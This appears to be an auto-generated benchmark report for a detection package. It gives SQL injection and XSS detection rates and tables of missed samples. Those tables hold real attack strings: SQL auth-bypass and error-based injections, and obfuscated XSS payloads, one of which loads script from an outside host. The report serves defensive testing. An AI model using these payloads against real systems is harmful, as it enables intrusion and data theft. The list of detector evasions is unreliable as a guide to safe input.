# Silker AI Detection Benchmark Results

- **Suite:** `community`
- **Package:** `@silker-ai/agent`
- **Version:** `1.6.7`
- **Date:** 2026-06-29
- **Samples:** 1494
- **Generated:** 2026-06-29T19:22:48.105Z

## Summary

| Dataset | Policy | N | TPR | Macro TPR | FPR | Precision | TP | FN | FP | TN |
| --- | --- | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: |
| SQL Injection | block on detection | 986 | 68.1% | 68.3% | 0.0% | 100.0% | 535 | 251 | 0 | 200 |
| XSS | block on detection | 508 | 96.1% | 97.4% | 0.0% | 100.0% | 296 | 12 | 0 | 200 |

## Misclassified samples

### SQL Injection - block on detection

| Type | Category | Sample |
| --- | --- | --- |
| FN | pat-Auth_Bypass | `'-'` |
| FN | pat-Auth_Bypass | `' '` |
| FN | pat-Auth_Bypass | `'&'` |
| FN | pat-Auth_Bypass | `'^'` |
| FN | pat-Auth_Bypass | `'*'` |
| FN | pat-Auth_Bypass | `"-"` |
| FN | pat-Auth_Bypass | `" "` |
| FN | pat-Auth_Bypass | `"&"` |
| FN | pat-Auth_Bypass | `"^"` |
| FN | pat-Auth_Bypass | `"*"` |
| FN | pat-Auth_Bypass | `" or ""-"` |
| FN | pat-Auth_Bypass | `" or "" "` |
| FN | pat-Auth_Bypass | `" or ""&"` |
| FN | pat-Auth_Bypass | `" or ""^"` |
| FN | pat-Auth_Bypass | `" or ""*"` |
| FN | pat-Auth_Bypass | `or true--` |
| FN | pat-Auth_Bypass | `" or true--` |
| FN | pat-Auth_Bypass | `") or true--` |
| FN | pat-Auth_Bypass | `') or true--` |
| FN | pat-Auth_Bypass | `')) or (('x'))=(('x` |
| FN | pat-Auth_Bypass | `")) or (("x"))=(("x` |
| FN | pat-Auth_Bypass2 | `==` |
| FN | pat-Auth_Bypass2 | `=` |
| FN | pat-Auth_Bypass2 | `'` |
| FN | pat-Auth_Bypass2 | `' --` |
| FN | pat-Auth_Bypass2 | `' #` |
| FN | pat-Auth_Bypass2 | `' –` |
| FN | pat-Auth_Bypass2 | `'--` |
| FN | pat-Auth_Bypass2 | `'/*` |
| FN | pat-Auth_Bypass2 | `'#` |
| FN | pat-Auth_Bypass2 | `" --` |
| FN | pat-Auth_Bypass2 | `" #` |
| FN | pat-Auth_Bypass2 | `"/*` |
| FN | pat-Auth_Bypass2 | `or true` |
| FN | pat-Auth_Bypass2 | `" or ""="` |
| FN | pat-Auth_Bypass2 | `like '%'` |
| FN | pat-Auth_Bypass2 | `'="or'` |
| FN | pat-Generic_ErrorBased | `OR 1=0` |
| FN | pat-Generic_ErrorBased | `OR x=y` |
| FN | pat-Generic_ErrorBased | `OR 1=0#` |
| FN | pat-Generic_ErrorBased | `OR x=y#` |
| FN | pat-Generic_ErrorBased | `OR 1=0--` |
| FN | pat-Generic_ErrorBased | `OR x=y--` |
| FN | pat-Generic_ErrorBased | `HAVING 1=1` |
| FN | pat-Generic_ErrorBased | `HAVING 1=0` |
| FN | pat-Generic_ErrorBased | `HAVING 1=1#` |
| FN | pat-Generic_ErrorBased | `HAVING 1=0#` |
| FN | pat-Generic_ErrorBased | `HAVING 1=1--` |
| FN | pat-Generic_ErrorBased | `HAVING 1=0--` |
| FN | pat-Generic_ErrorBased | `AND 1=0` |

_… and 201 more (see results JSON)._

### XSS - block on detection

| Type | Category | Sample |
| --- | --- | --- |
| FN | pat-JHADDIX_XSS | `'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E` |
| FN | pat-JHADDIX_XSS | `<<scr\0ipt/src=http://xss.com/xss.js></script` |
| FN | pat-JHADDIX_XSS | `%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E` |
| FN | pat-JHADDIX_XSS | `<%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64` |
| FN | pat-JHADDIX_XSS | `<math><a xlink:href="//jsfiddle.net/t846h/">click` |
| FN | pat-JHADDIX_XSS | `<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97l` |
| FN | pat-BRUTELOGIC-XSS-STRINGS | `<x %6Fnxxx=1` |
| FN | pat-BRUTELOGIC-XSS-STRINGS | `<x o%6Exxx=1` |
| FN | pat-BRUTELOGIC-XSS-STRINGS | `<x on%78xx=1` |
| FN | pat-BRUTELOGIC-XSS-STRINGS | `<x onxxx%3D1` |
| FN | pat-BRUTELOGIC-XSS-STRINGS | `<http://onxxx%3D1/` |
| FN | pat-xss_payloads_quick | `<h1>INJECTX</h1>` |
